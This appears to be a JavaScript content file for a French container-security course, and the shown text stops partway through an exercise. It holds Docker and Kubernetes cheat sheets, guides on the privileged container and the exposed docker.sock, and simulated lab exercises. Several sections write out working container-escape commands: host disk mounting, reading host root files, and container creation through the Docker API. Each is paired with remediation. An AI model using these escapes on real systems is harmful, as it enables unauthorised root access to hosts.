/* =============================================================
   Virtualisation et sécurité des conteneurs — Sécurité et pratique
   -------------------------------------------------------------
   Ce fichier COMPLÈTE le cours déjà déclaré dans
   data/cours/virtualisation-conteneurs.js : il ajoute des guides
   (aide-mémoire de commandes, failles pas à pas) et des chapitres
   d'exercices « terminal » simulés, en anglais, de difficulté
   croissante. Il doit être chargé APRÈS le fichier de base.

   Convention « Où suis-je dans l'arbre ? » (invite du shell) :
     analyst@debian:~$   → hôte (VM Debian), utilisateur normal
     root@debian:~#      → hôte, root
     root@<id>:/#        → À L'INTÉRIEUR d'un conteneur (id court)
     www-data@dvwa:/$    → dans un POD (le conteneur du pod)
     (kubectl …)         → tapé depuis l'hôte, PARLE au control-plane
   Chaque exercice « terminal » affiche en direct le champ `lieu`
   et change l'invite quand vous « entrez » dans un conteneur / pod.
   ============================================================= */

(function () {
  "use strict";
  const C = CONTENU["virtualisation-conteneurs"];
  if (!C) { console.warn("virtualisation-conteneurs non déclaré : chargez le fichier de base avant celui-ci."); return; }
  C.guides = C.guides || [];
  C.chapitres = C.chapitres || [];

  /* =========================================================
     GUIDE G2 — Aide-mémoire : se repérer et piloter
     ========================================================= */
  C.guides.push({
    id: "aide-memoire-commandes",
    titre: "Aide-mémoire : se repérer, piloter Docker et Kubernetes",
    resume: "Où suis-je dans l'arbre (hôte, conteneur, pod, control-plane) et quelle commande pour quoi : tableaux Docker, docker compose et kubectl avec l'explication de chaque commande.",
    duree: "20 min",
    niveau: "Débutant",
    prealables: [
      "Avoir lu le guide « Créer et lancer son premier conteneur ».",
      "Docker installé ; pour la partie Kubernetes, un cluster K3S (voir TP2) avec `kubectl` configuré."
    ],
    sections: [
      {
        type: "notion",
        titre: "Où suis-je ? Lire l'invite du shell",
        texte: "Avant de taper une commande, la première question de sécurité est **« où suis-je ? »**. L'invite (le début de ligne avant le curseur) vous le dit. Se tromper de niveau, c'est croire agir dans un conteneur alors qu'on est sur l'hôte — ou l'inverse.",
        points: [
          "`analyst@debian:~$` — vous êtes sur l'**hôte** (la VM Debian), en utilisateur normal. Le `$` final = pas root.",
          "`root@debian:~#` — toujours l'**hôte**, mais en **root**. Le `#` final = root. Ici vous pilotez tous les conteneurs.",
          "`root@3f9a2b:/#` — vous êtes **à l'intérieur d'un conteneur** : l'identifiant court (`3f9a2b`) a remplacé le nom d'hôte. Ce que vous cassez ici reste, en principe, dans le conteneur.",
          "`www-data@dvwa-7d9f:/$` — vous êtes dans un **pod** Kubernetes (le conteneur du pod), sous un utilisateur applicatif non-root.",
          "Une commande `kubectl …` se tape **depuis l'hôte** mais s'adresse au **control-plane** (le cerveau du cluster) : vous ne « déplacez » pas votre shell, vous envoyez un ordre à distance."
        ],
        remarque: "Repère mental de l'arbre : Hôte physique → moteur (Docker) → conteneurs. En Kubernetes : control-plane (kube-apiserver, etcd, scheduler) → nœuds workers → pods → conteneurs."
      },
      {
        type: "notion",
        titre: "Changer de niveau : les commandes qui vous déplacent",
        texte: "Trois commandes font passer d'un niveau de l'arbre à un autre. Retenez ce qu'elles changent à votre invite.",
        points: [
          "`docker exec -it <conteneur> bash` — depuis l'hôte, **entre** dans un conteneur en marche. L'invite devient `root@<id>:/#`. `exit` vous **ramène** sur l'hôte.",
          "`kubectl exec -it <pod> -- bash` — depuis l'hôte, **entre** dans le conteneur d'un pod. L'invite devient celle du pod.",
          "`ssh user@serveur` — change carrément de machine (hôte → autre hôte).",
          "Sortir : `exit` (ou Ctrl-D) remonte d'un cran vers là d'où vous veniez."
        ]
      },
      {
        titre: "Docker — images et cycle de vie",
        texte: "Le socle du quotidien : récupérer une image, lancer, observer, entrer, nettoyer. Toutes ces commandes se tapent **depuis l'hôte**.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`docker pull nginx:1.27-alpine`", "Télécharge une image depuis le registre (précisez toujours un tag)"],
            ["`docker images`", "Liste les images présentes localement"],
            ["`docker run -d --name web -p 8080:80 nginx`", "Crée et démarre un conteneur détaché, publie le port 80→8080"],
            ["`docker run --rm -it alpine sh`", "Conteneur jetable interactif ; `--rm` le supprime en sortant"],
            ["`docker ps`", "Conteneurs en cours (`-a` inclut les arrêtés)"],
            ["`docker logs -f web`", "Affiche/suit la sortie du conteneur"],
            ["`docker exec -it web bash`", "Ouvre un shell DANS le conteneur (vous changez de niveau)"],
            ["`docker stop web` / `docker rm web`", "Arrête / supprime le conteneur"],
            ["`docker build -t mon-site:1.0 .`", "Construit une image à partir du `Dockerfile` du dossier courant"]
          ]
        },
        remarque: "`-p hôte:conteneur` : le premier nombre est le port ouvert sur l'hôte, le second celui écouté dans le conteneur."
      },
      {
        titre: "Docker — inspecter et enquêter",
        texte: "En sécurité, avant d'agir on observe. Ces commandes révèlent comment un conteneur est configuré — et donc s'il est dangereux.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle révèle"],
          lignes: [
            ["`docker inspect web`", "Toute la configuration en JSON : montages, privilèges, réseau, variables"],
            ["`docker inspect -f '{{.HostConfig.Privileged}}' web`", "Répond `true`/`false` : le conteneur est-il privilégié ?"],
            ["`docker inspect -f '{{.Mounts}}' web`", "Liste les volumes montés (repère un `/:/host` dangereux)"],
            ["`docker history --no-trunc img`", "Reconstitue les couches / commandes ayant bâti l'image"],
            ["`docker diff web`", "Fichiers ajoutés/modifiés/supprimés depuis le lancement"],
            ["`docker top web`", "Processus tournant dans le conteneur"],
            ["`docker stats`", "Consommation CPU/RAM/réseau en direct (repère un cryptominer)"]
          ]
        },
        attention: "Deux signaux d'alerte à chercher en priorité dans `docker inspect` : `\"Privileged\": true` et un montage de `/` ou `/var/run/docker.sock`. Ce sont les deux évasions les plus classiques (voir les failles pas à pas)."
      },
      {
        titre: "Docker — durcir au lancement",
        texte: "Les options qui réduisent la surface d'attaque, à connaître pour la partie défense.",
        tableau: {
          entetes: ["Option de `docker run`", "Effet de sécurité"],
          lignes: [
            ["`--user 1000:1000`", "Tourne sous un utilisateur non-root"],
            ["`--read-only`", "Système de fichiers du conteneur en lecture seule"],
            ["`--cap-drop ALL --cap-add NET_BIND_SERVICE`", "Retire toutes les capabilities, ne rajoute que le strict nécessaire"],
            ["`--security-opt no-new-privileges`", "Interdit tout gain de privilège (ex. via un binaire SUID)"],
            ["`--memory 256m --cpus 0.5`", "Limite les ressources (cgroups) : évite l'épuisement de l'hôte"],
            ["`--pids-limit 100`", "Plafonne le nombre de processus (anti fork-bomb)"],
            ["`-v données:/data:ro`", "Monte un volume précis en lecture seule, plutôt que `/`"]
          ]
        },
        remarque: "À l'inverse, `--privileged`, `-v /:/host` et `-v /var/run/docker.sock:/…` sont à bannir sauf besoin explicite et maîtrisé."
      },
      {
        titre: "Kubernetes — observer le cluster (depuis l'hôte)",
        texte: "`kubectl` parle au **control-plane**. On lit d'abord, on agit ensuite. `-n <namespace>` cible un espace ; `-A` = tous les namespaces.",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`kubectl get nodes`", "Liste les nœuds (workers + control-plane)"],
            ["`kubectl get pods -n dvwa-lab`", "Liste les pods d'un namespace"],
            ["`kubectl get all -A`", "Toutes les ressources, tous namespaces"],
            ["`kubectl describe pod <pod> -n ns`", "Détail d'un pod : image, montages, événements"],
            ["`kubectl logs <pod> -n ns`", "Journaux du conteneur d'un pod"],
            ["`kubectl exec -it <pod> -n ns -- bash`", "Ouvre un shell DANS le pod (changement de niveau)"],
            ["`kubectl get sa,role,rolebinding -n ns`", "Comptes de service et droits RBAC du namespace"],
            ["`kubectl auth can-i --list`", "Ce que le compte courant a le droit de faire"]
          ]
        },
        remarque: "`kubectl describe` et `kubectl auth can-i` sont vos meilleurs outils d'audit : ils montrent respectivement la configuration réelle et les droits effectifs."
      },
      {
        titre: "Kubernetes — déployer une application",
        texte: "On décrit l'état souhaité dans un manifeste YAML, puis `kubectl apply` le réalise. `helm` et `kustomize` industrialisent cela (voir TP2).",
        tableau: {
          entetes: ["Commande", "Ce qu'elle fait"],
          lignes: [
            ["`kubectl apply -f app.yaml`", "Crée/met à jour les ressources décrites dans le fichier"],
            ["`kubectl apply --dry-run=client -f app.yaml`", "Teste le manifeste sans rien appliquer"],
            ["`kubectl delete -f app.yaml`", "Supprime les ressources du fichier"],
            ["`kubectl scale deploy/web --replicas=5 -n ns`", "Ajuste le nombre de réplicas"],
            ["`kubectl apply -k overlays/prod`", "Applique un overlay Kustomize"],
            ["`helm repo add bitnami https://charts.bitnami.com/bitnami`", "Ajoute un dépôt de charts Helm"],
            ["`helm install web bitnami/nginx -n ns`", "Installe une application packagée (chart)"],
            ["`helm upgrade web bitnami/nginx -n ns -f values.yaml`", "Met à jour une release avec de nouvelles valeurs"]
          ]
        },
        attention: "Un `Deployment` recrée automatiquement un pod supprimé (boucle de réconciliation) : pour arrêter réellement une application, supprimez le Deployment, pas le pod."
      }
    ]
  });

  /* =========================================================
     GUIDE G3 — Faille pas à pas : le conteneur privilégié
     ========================================================= */
  C.guides.push({
    id: "faille-conteneur-privilegie",
    titre: "Faille pas à pas — Le conteneur privilégié",
    resume: "Comprendre pourquoi `--privileged` et `-v /:/host` cassent l'isolation, dérouler l'évasion vers l'hôte (défensivement), puis corriger. Décomposé étape par étape en repérant où l'on se trouve dans l'arbre.",
    duree: "25 min",
    niveau: "Intermédiaire",
    badge: "Faille pas à pas",
    prealables: [
      "Avoir lu l'aide-mémoire des commandes.",
      "Contexte pédagogique : ces manipulations se font dans un environnement d'entraînement isolé (CTF de cours), jamais sur un système tiers."
    ],
    sections: [
      {
        type: "notion",
        titre: "Le principe : une isolation logique, pas matérielle",
        texte: "Un conteneur partage le **noyau** de l'hôte. Son isolation vient uniquement des namespaces et cgroups posés par le moteur. `--privileged` **retire** ces garde-fous : le conteneur récupère toutes les capabilities et l'accès aux périphériques de l'hôte. Ajoutez un montage de `/` et l'hôte est, littéralement, dans le conteneur.",
        points: [
          "**`--privileged`** : toutes les capabilities Linux + accès aux `/dev/*` de l'hôte (dont les disques).",
          "**`-v /:/host`** : le système de fichiers entier de l'hôte est monté dans le conteneur, sous `/host`.",
          "Combinés, ils transforment un simple accès conteneur en **contrôle total de l'hôte** — et donc de tous les autres conteneurs."
        ],
        remarque: "C'est le challenge 1 du TP4. On le déroule ici pour comprendre chaque étape, pas pour la performance."
      },
      {
        titre: "Étape 0 — Se repérer : je suis sur l'hôte",
        texte: "Invite `analyst@debian:~$` : vous êtes sur la **VM hôte**, utilisateur normal. Vous voyez le conteneur, mais vous n'êtes pas encore dedans. On commence toujours par observer.",
        code: "docker ps",
        sortie: "CONTAINER ID   IMAGE                  NAMES\n3f9a2b7c1d0e   ctf-ch1-privileged     ctf-ch1-privileged",
        remarque: "Un seul conteneur suspect. On va d'abord confirmer POURQUOI il est dangereux avant d'y toucher."
      },
      {
        titre: "Étape 1 — Confirmer la mauvaise configuration",
        texte: "Toujours sur l'hôte. On interroge la configuration réelle du conteneur. Deux drapeaux rouges à vérifier : est-il privilégié, et que monte-t-il ?",
        code: "docker inspect -f '{{.HostConfig.Privileged}}' ctf-ch1-privileged\ndocker inspect -f '{{.Mounts}}' ctf-ch1-privileged",
        sortie: "true\n[{bind  /  /host   true }]",
        attention: "`true` + un montage de `/` vers `/host` : le diagnostic est posé. Sur un vrai audit, ce constat suffit à classer le conteneur en critique, avant même toute exploitation."
      },
      {
        titre: "Étape 2 — Entrer dans le conteneur (changement de niveau)",
        texte: "On passe de l'hôte à l'intérieur du conteneur avec `docker exec`. **Regardez l'invite changer** : `analyst@debian:~$` devient `root@3f9a2b:/#`. Vous n'êtes plus sur l'hôte, vous êtes dans le conteneur — et vous y êtes root.",
        code: "docker exec -it ctf-ch1-privileged /bin/bash\n# l'invite devient :\n# root@3f9a2b:/#",
        remarque: "Rien n'est encore « cassé » : être root DANS un conteneur est normal. Le danger vient de ce que ce conteneur a le droit de toucher."
      },
      {
        titre: "Étape 3 — Atteindre le disque de l'hôte",
        texte: "Vous êtes maintenant dans le conteneur (`root@3f9a2b:/#`). Le système de fichiers de l'hôte est monté sous `/host`. Lire un fichier normalement inaccessible depuis un conteneur prouve l'évasion.",
        code: "ls /host\ncat /host/root/ctf_flags/flag1_root_escape.txt",
        sortie: "bin  boot  etc  home  root  var  ...\nFLAG{privileged_container_equals_host_root}",
        attention: "Depuis un conteneur, vous venez de lire `/root` de l'HÔTE. En écriture, vous pourriez ajouter une clé SSH root, modifier `/etc/shadow`, installer un service. L'hôte est compromis, donc tous ses conteneurs aussi."
      },
      {
        titre: "Étape 4 — Revenir sur l'hôte",
        texte: "`exit` referme le shell du conteneur et vous ramène sur l'hôte : l'invite redevient `analyst@debian:~$`. Toujours savoir remonter l'arbre.",
        code: "exit\n# de retour : analyst@debian:~$"
      },
      {
        type: "notion",
        titre: "Corriger : remédiation et bonnes pratiques",
        texte: "La faille n'est pas un bug de Docker : c'est une **configuration** dangereuse. On la corrige à la source.",
        points: [
          "Ne **jamais** utiliser `--privileged` par confort. Si un besoin précis existe (accès à un périphérique), ajouter uniquement la capability nécessaire : `--cap-drop ALL --cap-add <CAP>`.",
          "Ne **jamais** monter `/` ni un dossier système. Monter seulement le sous-dossier utile, en lecture seule : `-v /srv/data:/data:ro`.",
          "Ajouter `--security-opt no-new-privileges` et `--read-only`.",
          "Tourner en non-root (`--user`), même dans le conteneur.",
          "En Kubernetes, interdire ces pratiques au niveau du cluster (Pod Security Admission niveau *restricted*, ou une policy Kyverno/Gatekeeper qui refuse `privileged` et les `hostPath` sensibles)."
        ],
        code: "# version durcie du même service\ndocker run -d --name app \\\n  --user 1000:1000 \\\n  --read-only \\\n  --cap-drop ALL \\\n  --security-opt no-new-privileges \\\n  -v /srv/data:/data:ro \\\n  nginx:1.27-alpine",
        remarque: "Règle à retenir : un conteneur ne devrait avoir que ce dont son application a strictement besoin — c'est le principe de moindre privilège appliqué à la conteneurisation."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Manipuler et évaluer un conteneur (Docker)
     3 exercices « terminal », difficulté croissante.
     ========================================================= */
  C.chapitres.push({
    id: "ch-docker-pratique",
    titre: "Chapitre 2 — Manipuler et évaluer un conteneur (Docker)",
    description: "Trois terminaux simulés, du plus simple au plus avancé, autour du conteneur privilégié : reconnaissance, évasion façon TP, puis évasion sans volume pré-monté.",
    exercices: [

      /* ---- Niveau 1 : plus facile que le TP (recon + entrer) ---- */
      {
        type: "terminal",
        id: "term-docker-recon",
        titre: "Niveau 1 — Reconnaissance d'un conteneur suspect",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "On n'attaque jamais sans observer. Avant de toucher un conteneur, on liste ce qui tourne, on lit sa configuration, puis on y entre. Objectif : se repérer dans l'arbre et lire une configuration Docker.",
        exemple: {
          legende: "Lire un champ précis de la configuration",
          code: "docker inspect -f '{{.HostConfig.Privileged}}' <conteneur>"
        },
        intro: [
          "You are logged on the host VM as the low-privilege user `analyst`.",
          "A container is running on this machine. Your job here is only to observe it: list it, read its configuration, then step inside. No escape yet."
        ],
        accueil: "Recon lab — type 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Lister les conteneurs **en cours d'exécution** sur l'hôte.",
            indice: "La commande de base pour voir ce qui tourne.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+ps"],
            interdire: ["-a\\b"],
            solution: "docker ps",
            sortie: "CONTAINER ID   IMAGE                NAMES\n3f9a2b7c1d0e   ctf-ch1-privileged   ctf-ch1-privileged"
          },
          {
            enonce: "Afficher si le conteneur `ctf-ch1-privileged` est **privilégié** (champ `.HostConfig.Privileged`).",
            indice: "docker inspect -f '{{.HostConfig.Privileged}}' <nom>",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+inspect", "privileged", "ctf-ch1"],
            solution: "docker inspect -f '{{.HostConfig.Privileged}}' ctf-ch1-privileged",
            sortie: "true"
          },
          {
            enonce: "Lister les **montages** du conteneur pour repérer un éventuel `/:/host`.",
            indice: "Même commande, mais le champ '{{.Mounts}}'.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+inspect", "mounts", "ctf-ch1"],
            solution: "docker inspect -f '{{.Mounts}}' ctf-ch1-privileged",
            sortie: "[{bind  /  /host  true }]"
          },
          {
            enonce: "**Entrer** dans le conteneur avec un shell interactif (vous changez de niveau).",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → on entre dans le conteneur",
            invite: "root@3f9a2b:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch1", "(bash|sh)"],
            solution: "docker exec -it ctf-ch1-privileged /bin/bash",
            sortie: "root@3f9a2b:/#"
          },
          {
            enonce: "Confirmer que vous êtes **root à l'intérieur** du conteneur.",
            indice: "Une commande de trois lettres affiche l'utilisateur courant.",
            lieu: "Intérieur du conteneur ctf-ch1 (root)",
            motifs: ["^id\\b"],
            solution: "id",
            sortie: "uid=0(root) gid=0(root) groups=0(root)"
          }
        ]
      },

      /* ---- Niveau 2 : équivalent TP4 challenge 1 (évasion) ---- */
      {
        type: "terminal",
        id: "term-docker-privesc",
        titre: "Niveau 2 — Évasion d'un conteneur privilégié (niveau TP)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Un conteneur `--privileged` avec `-v /:/host` monte tout l'hôte sous `/host`. Depuis l'intérieur, lire un fichier de l'hôte prouve l'évasion. C'est le challenge 1 du TP4.",
        exemple: {
          legende: "Le système de fichiers de l'hôte est sous /host",
          code: "cat /host/etc/hostname   # depuis l'intérieur du conteneur"
        },
        intro: [
          "Same host, same container `ctf-ch1-privileged` (privileged, with `/` mounted at `/host`).",
          "Goal: step inside and read a flag that lives on the HOST filesystem, proving a full container-to-host escape."
        ],
        accueil: "Escape lab — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Depuis l'hôte, confirmer une dernière fois le montage dangereux du conteneur.",
            indice: "docker inspect avec le champ '{{.Mounts}}'.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+inspect", "ctf-ch1"],
            solution: "docker inspect -f '{{.Mounts}}' ctf-ch1-privileged",
            sortie: "[{bind  /  /host  true }]"
          },
          {
            enonce: "Entrer dans le conteneur avec un shell interactif.",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@3f9a2b:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch1", "(bash|sh)"],
            solution: "docker exec -it ctf-ch1-privileged /bin/bash",
            sortie: "root@3f9a2b:/#"
          },
          {
            enonce: "Vérifier que le système de fichiers de l'hôte est bien monté sous `/host`.",
            indice: "Listez simplement le contenu de /host.",
            lieu: "Intérieur du conteneur ctf-ch1 (root)",
            motifs: ["^ls\\s+/host"],
            solution: "ls /host",
            sortie: "bin  boot  dev  etc  home  root  sbin  usr  var"
          },
          {
            enonce: "Lire le flag situé sur l'HÔTE : `/root/ctf_flags/flag1_root_escape.txt` (via `/host`).",
            indice: "cat /host/root/ctf_flags/flag1_root_escape.txt",
            lieu: "Conteneur ctf-ch1 → lecture du disque de l'hôte",
            motifs: ["^cat\\s", "/host/root", "flag1"],
            solution: "cat /host/root/ctf_flags/flag1_root_escape.txt",
            sortie: "FLAG{privileged_container_equals_host_root}"
          },
          {
            enonce: "Revenir sur l'hôte (remonter d'un niveau dans l'arbre).",
            indice: "Une commande de quatre lettres ferme le shell du conteneur.",
            lieu: "Conteneur → retour à l'hôte",
            invite: "analyst@debian:~$",
            motifs: ["^exit\\b"],
            solution: "exit",
            sortie: "analyst@debian:~$"
          }
        ]
      },

      /* ---- Niveau 3 : plus dur que le TP (monter le disque soi-même) ---- */
      {
        type: "terminal",
        id: "term-docker-privesc-avance",
        titre: "Niveau 3 — Évasion sans volume pré-monté (avancé)",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Cette fois le conteneur est privilégié mais NE monte PAS `/`. `--privileged` donne malgré tout l'accès aux périphériques de l'hôte : on peut donc monter soi-même le disque de l'hôte depuis l'intérieur. C'est l'évasion « classique » et elle est plus exigeante.",
        exemple: {
          legende: "Monter un disque de l'hôte depuis un conteneur privilégié",
          code: "lsblk                 # trouver le disque de l'hôte\nmount /dev/sda1 /mnt  # le monter dans le conteneur"
        },
        intro: [
          "A privileged container `ctf-ch2-priv` is running, but this time WITHOUT any `-v /:/host` mount.",
          "Because `--privileged` still exposes the host block devices, you will mount the host disk yourself from inside the container, then read the flag. Harder than the TP: no ready-made /host."
        ],
        accueil: "Advanced escape lab — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Entrer dans le conteneur privilégié `ctf-ch2-priv`.",
            indice: "docker exec -it <nom> /bin/bash",
            lieu: "Hôte → intérieur du conteneur",
            invite: "root@c2a1f4:/#",
            motifs: ["^docker\\s+exec", "-it", "ctf-ch2", "(bash|sh)"],
            solution: "docker exec -it ctf-ch2-priv /bin/bash",
            sortie: "root@c2a1f4:/#"
          },
          {
            enonce: "Confirmer que vous disposez bien de capabilities étendues (conteneur privilégié).",
            indice: "capsh --print   (ou lire /proc/self/status)",
            lieu: "Intérieur du conteneur ctf-ch2 (root, privilégié)",
            motifs: ["^capsh", "--print"],
            solution: "capsh --print",
            sortie: "Current: =ep\nBounding set =cap_chown,cap_dac_override,...,cap_sys_admin,...\n(=ep + cap_sys_admin : conteneur privilégié)"
          },
          {
            enonce: "Vérifier qu'aucun montage de l'hôte n'est présent : `/host` ne doit **pas** exister.",
            indice: "Listez la racine et constatez l'absence de /host.",
            lieu: "Intérieur du conteneur ctf-ch2 (root)",
            motifs: ["^ls\\s+/$"],
            solution: "ls /",
            sortie: "bin  dev  etc  home  proc  root  sys  tmp  usr  var\n(pas de /host : rien n'est pré-monté)"
          },
          {
            enonce: "Repérer le **disque de l'hôte** exposé comme périphérique bloc.",
            indice: "lsblk liste les périphériques bloc visibles.",
            lieu: "Intérieur du conteneur ctf-ch2 (root)",
            motifs: ["^lsblk\\b"],
            solution: "lsblk",
            sortie: "NAME   SIZE TYPE MOUNTPOINT\nsda     40G disk\n└─sda1  40G part\n(sda1 = disque racine de l'hôte, non monté ici)"
          },
          {
            enonce: "**Monter** la partition racine de l'hôte (`/dev/sda1`) dans `/mnt`.",
            indice: "mount /dev/sda1 /mnt",
            lieu: "Conteneur ctf-ch2 → on monte le disque de l'hôte",
            motifs: ["^mount\\s", "/dev/sda1", "/mnt"],
            solution: "mount /dev/sda1 /mnt",
            sortie: "[  OK  ] /dev/sda1 monté sur /mnt (le disque de l'hôte est maintenant lisible)"
          },
          {
            enonce: "Lire le flag de l'hôte via le disque monté : `/mnt/root/ctf_flags/flag_adv.txt`.",
            indice: "cat /mnt/root/ctf_flags/flag_adv.txt",
            lieu: "Conteneur ctf-ch2 → lecture du disque de l'hôte monté",
            motifs: ["^cat\\s", "/mnt/root", "flag_adv"],
            solution: "cat /mnt/root/ctf_flags/flag_adv.txt",
            sortie: "FLAG{privileged_means_you_can_mount_the_host_disk}"
          }
        ]
      }
    ]
  });

  /* =========================================================
     GUIDE G4 — Faille pas à pas : le socket Docker exposé
     ========================================================= */
  C.guides.push({
    id: "faille-docker-sock",
    titre: "Faille pas à pas — Le socket Docker exposé",
    resume: "Pourquoi monter `/var/run/docker.sock` dans un conteneur revient à donner les clés de l'hôte, comment l'exploiter via l'API Docker (défensivement), et comment s'en prémunir. En repérant à chaque étape à qui l'on parle dans l'arbre.",
    duree: "25 min",
    niveau: "Intermédiaire",
    badge: "Faille pas à pas",
    prealables: [
      "Avoir fait la faille « conteneur privilégié ».",
      "Comprendre qu'un conteneur parle à un service (le démon Docker) via un fichier socket."
    ],
    sections: [
      {
        type: "notion",
        titre: "Le principe : le socket, c'est le démon",
        texte: "Le démon Docker (le service qui crée et gère les conteneurs) écoute sur un fichier spécial : `/var/run/docker.sock`. Toute la commande `docker` n'est qu'un client qui parle à ce socket. **Quiconque peut écrire dans ce socket peut commander le démon** — donc créer un conteneur qui monte tout l'hôte.",
        points: [
          "Monter le socket dans un conteneur (`-v /var/run/docker.sock:/var/run/docker.sock`) donne à ce conteneur le pouvoir du démon de l'hôte.",
          "Le démon tourne en **root sur l'hôte** : un conteneur qui le pilote peut créer un conteneur privilégié, monter `/`, lire n'importe quoi.",
          "Subtilité de l'arbre : depuis le conteneur, vos requêtes API ne restent pas dans le conteneur — elles s'exécutent au niveau du **démon de l'hôte**."
        ],
        remarque: "C'est le challenge 2 du TP4. La cible n'est pas le conteneur, mais le service auquel il a le droit de parler."
      },
      {
        titre: "Étape 0 — Se repérer et repérer le socket",
        texte: "Sur l'hôte (`analyst@debian:~$`), on confirme qu'un conteneur monte le socket. C'est le signal d'alerte.",
        code: "docker inspect -f '{{.Mounts}}' ctf-ch2-dockersock",
        sortie: "[{bind  /var/run/docker.sock  /var/run/docker.sock  true }]",
        attention: "Un montage de `docker.sock` est aussi grave qu'un `--privileged` : il faut le traiter comme un accès root à l'hôte."
      },
      {
        titre: "Étape 1 — Entrer dans le conteneur qui détient le socket",
        texte: "`docker exec` fait passer l'invite à `root@<id>:/#`. Vous êtes dans le conteneur ; à l'intérieur, le socket est visible comme un fichier.",
        code: "docker exec -it ctf-ch2-dockersock /bin/bash\n# root@7a1c:/#\nls -l /var/run/docker.sock",
        sortie: "srw-rw---- 1 root docker 0 /var/run/docker.sock",
        remarque: "`s` en tête = socket. Le posséder = pouvoir donner des ordres au démon de l'hôte."
      },
      {
        titre: "Étape 2 — Parler au démon (lecture d'abord)",
        texte: "On interroge l'API via `curl --unix-socket`. Commencer par une requête inoffensive prouve l'accès sans rien casser. **Repère d'arbre** : ce `GET` s'exécute côté démon de l'hôte, pas dans le conteneur.",
        code: "curl -s --unix-socket /var/run/docker.sock http://localhost/version",
        sortie: "{\"Version\":\"27.1.1\",\"ApiVersion\":\"1.46\",\"Os\":\"linux\", ...}",
        remarque: "Si cette requête répond, vous contrôlez déjà le démon : tout le reste n'est que payloads."
      },
      {
        titre: "Étape 3 — Créer un conteneur qui monte l'hôte",
        texte: "On demande au démon de créer un nouveau conteneur qui monte `/` de l'hôte sous `/host`. C'est le démon (root sur l'hôte) qui l'exécute pour nous.",
        legende: "Requête API — création",
        code: "curl -s --unix-socket /var/run/docker.sock \\\n  -X POST -H \"Content-Type: application/json\" \\\n  -d '{\"Image\":\"alpine\",\"Cmd\":[\"sleep\",\"infinity\"],\"HostConfig\":{\"Binds\":[\"/:/host\"]}}' \\\n  http://localhost/containers/create?name=pwn",
        sortie: "{\"Id\":\"b91e...\",\"Warnings\":[]}"
      },
      {
        titre: "Étape 4 — Démarrer, puis récupérer l'accès hôte",
        texte: "On démarre le conteneur créé, on sort sur l'hôte, puis on entre dans `pwn` : son `/host` est le disque de l'hôte.",
        code: "curl -s -X POST --unix-socket /var/run/docker.sock \\\n  http://localhost/containers/pwn/start\nexit                       # retour hôte\ndocker exec -it pwn sh     # on entre dans le conteneur créé\ncat /host/root/ctf_flags/flag2_dockersock.txt",
        sortie: "FLAG{docker_sock_is_root_on_the_host}",
        attention: "Bilan d'arbre : conteneur (socket) → démon de l'hôte → nouveau conteneur → disque de l'hôte. Un seul montage mal placé a suffi."
      },
      {
        type: "notion",
        titre: "Corriger : ne jamais exposer le socket",
        texte: "La seule bonne configuration est de ne pas monter le socket. Quand un outil en a vraiment besoin (CI, agent de supervision), on passe par des garde-fous.",
        points: [
          "Ne pas monter `/var/run/docker.sock` dans un conteneur applicatif — jamais « pour voir ».",
          "Si un accès au démon est indispensable, utiliser un **proxy filtrant** (ex. `docker-socket-proxy`) qui n'autorise que les appels en lecture nécessaires.",
          "Préférer une API applicative dédiée plutôt que l'accès brut au démon.",
          "En Kubernetes, ne pas monter le socket du runtime via un `hostPath` ; restreindre par RBAC et Pod Security Admission.",
          "Surveiller l'accès au socket (Falco a une règle dédiée : « Access to Docker socket »)."
        ],
        remarque: "Règle jumelle du privilège : `docker.sock` monté = accès root à l'hôte. On l'audite en cherchant ce montage dans `docker inspect` et dans les manifests."
      }
    ]
  });

  /* =========================================================
     CHAPITRE — Le socket Docker exposé (3 niveaux)
     ========================================================= */
  C.chapitres.push({
    id: "ch-docker-sock",
    titre: "Chapitre 3 — Le socket Docker exposé",
    description: "Trois terminaux autour de `/var/run/docker.sock` : reconnaissance et lecture de l'API, exploitation façon TP (créer un conteneur qui monte l'hôte), puis escalade vers un shell root de l'hôte via chroot.",
    exercices: [

      /* ---- Niveau 1 : recon + API en lecture ---- */
      {
        type: "terminal",
        id: "term-sock-recon",
        titre: "Niveau 1 — Repérer et interroger le socket",
        terminal: "bash — hôte Debian",
        invite: "analyst@debian:~$",
        cours: "Le socket `/var/run/docker.sock` est l'interface du démon Docker. Un conteneur qui le monte peut commander le démon de l'hôte. Ici on se contente de repérer le montage et de lire l'API — sans rien créer.",
        exemple: {
          legende: "Parler à l'API du démon via le socket",
          code: "curl -s --unix-socket /var/run/docker.sock http://localhost/version"
        },
        intro: [
          "You are `analyst` on the host. A container `ctf-ch2-dockersock` runs with the Docker socket mounted inside it.",
          "Recon only: confirm the mount, step inside, see the socket file, and prove you can talk to the daemon with a harmless read request."
        ],
        accueil: "Socket recon — 'help' for a hint, 'solution' to reveal a command.",
        objectifs: [
          {
            enonce: "Sur l'hôte, vérifier que `ctf-ch2-dockersock` monte le socket Docker.",
            indice: "docker inspect avec le champ '{{.Mounts}}'.",
            lieu: "Hôte : VM Debian (analyst)",
            motifs: ["^docker\\s+inspect", "ctf-ch2"],
            solution: "docker inspect -f '{{.Mounts}}' ctf-ch2-dockersock",
            sortie: "[{bind  /var/run/docker.sock  /var/run/docker.sock  true }]"
          },
          {
            enonce: "Entrer dans le conteneur (changement de niveau).",
